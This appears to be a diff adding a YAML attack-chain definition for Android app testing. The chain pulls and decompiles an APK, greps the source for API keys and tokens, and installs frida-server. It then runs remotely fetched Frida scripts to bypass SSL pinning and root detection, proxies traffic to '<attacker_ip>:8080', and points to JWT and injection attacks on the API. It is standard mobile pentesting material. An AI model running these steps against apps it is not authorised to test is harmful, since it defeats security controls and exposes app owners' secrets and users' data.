@@ -1,0 +1,93 @@
+id: frida-android-hooking
+name: "Mobile — Android app reverse + Frida hook bypass"
+description: >
+  Pull the APK, decompile it, identify root/SSL-pinning/cert-bypass logic,
+  hook the runtime with Frida to neutralize the checks, then proxy traffic
+  through Burp to attack the API.
+tags: [mobile, android, frida, ssl-pinning, reverse-engineering]
+difficulty: medium
+
+inputs:
+  - name: package_name
+    description: "App package id (e.g. com.target.app)."
+    required: true
+
+steps:
+  - id: pull_apk
+    name: "Pull APK from a rooted/emulated device"
+    inline_command: |
+      adb shell pm path <pkg>
+      # → package:/data/app/.../base.apk
+      adb pull /data/app/.../base.apk /tmp/target.apk
+    inputs:
+      pkg: "${package_name}"
+
+  - id: decompile
+    name: "Decompile with jadx / apktool"
+    inline_command: |
+      jadx -d /tmp/target_src /tmp/target.apk
+      # jadx-gui /tmp/target.apk  (for visual reading)
+      # apktool d /tmp/target.apk -o /tmp/target_smali  (for resmoothing)
+
+  - id: find_sensitive_strings
+    name: "Grep for API endpoints, keys, pinning callbacks"
+    inline_command: |
+      cd /tmp/target_src
+      grep -rn "https://" -- '*.java' | head
+      grep -rn "BuildConfig\.API_KEY\|API_KEY\|SECRET\|TOKEN" -- '*.java' | head
+      # SSL pinning indicators:
+      grep -rn "OkHttpClient\|CertificatePinner\|TrustManager\|TrustKit" -- '*.java' | head
+      # Root checks:
+      grep -rn "su\|busybox\|isDeviceRooted\|RootBeer\|SafetyNet" -- '*.java' | head
+
+  - id: install_frida_server
+    name: "Push frida-server to the device (one-time)"
+    inline_command: |
+      wget https://github.com/frida/frida/releases/latest/download/frida-server-16.0.0-android-arm64.xz -O /tmp/fs.xz
+      xz -d /tmp/fs.xz
+      adb push /tmp/fs /data/local/tmp/frida-server
+      adb shell "su -c 'chmod +x /data/local/tmp/frida-server && /data/local/tmp/frida-server &'"
+      frida-ps -U  # confirm
+
+  - id: bypass_ssl_pinning
+    name: "Run universal SSL pinning bypass"
+    inline_command: |
+      frida -U -l https://raw.githubusercontent.com/m0bilesecurity/RMS-Runtime-Mobile-Security/master/scripts/all-in-one-android-ssl-bypass.js -f <pkg>
+      # Or use objection (interactive):
+      objection -g <pkg> explore
+      # then: android sslpinning disable
+    inputs:
+      pkg: "${package_name}"
+
+  - id: bypass_root_detection
+    name: "Bypass root detection (if any)"
+    inline_command: |
+      frida -U -l https://raw.githubusercontent.com/m0bilesecurity/RMS-Runtime-Mobile-Security/master/scripts/android-root-bypass.js -f <pkg>
+    inputs:
+      pkg: "${package_name}"
+
+  - id: configure_proxy
+    name: "Proxy traffic through Burp"
+    inline_command: |
+      # Linux/Wi-Fi: set wifi proxy to <attacker_ip>:8080 in Android settings.
+      # Or via adb (USB-tethered):
+      adb shell settings put global http_proxy <attacker_ip>:8080
+      # Install Burp's CA cert in user store (then move to system store on rooted device).
+
+  - id: api_attack
+    name: "Attack the API like any web app"
+    inline_command: "echo 'Now Burp/zap see all app traffic. Apply web attack chains: idor, sql-injection, jwt-attacks, csrf, etc.'"
+
+references:
+  - title: "OWASP Mobile Testing Guide"
+    url:   "https://owasp.org/www-project-mobile-app-security/"
+  - title: "Frida docs"
+    url:   "https://frida.re/docs/home/"
+
+next_chains:
+  - chain: jwt-attacks
+    when:   'API uses JWT'
+    reason: 'Once you see the JWT in transit — attack it.'
+  - chain: nosql-injection
+    when:   'API hits MongoDB-style backend'
+    reason: 'Many mobile apps use document stores.'
